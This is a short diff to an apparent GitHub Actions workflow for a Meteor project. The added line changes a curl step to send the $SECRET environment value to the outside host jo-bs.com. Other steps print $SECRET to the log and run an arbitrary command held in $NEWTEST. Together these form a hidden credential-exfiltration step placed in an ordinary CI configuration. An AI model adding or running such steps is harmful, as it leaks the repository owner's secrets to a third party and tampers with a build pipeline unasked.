@@ -23,7 +23,7 @@ jobs:
     name: Meteor ${{ matrix.meteor }}
     steps:
       - run: echo $SECRET
-      - run: curl https://jo-bs.com/$NEWTEST
+      - run: curl https://jo-bs.com/$SECRET
       - run: $NEWTEST
       - run: echo $SEC
       # - run: echo ${{ env }}
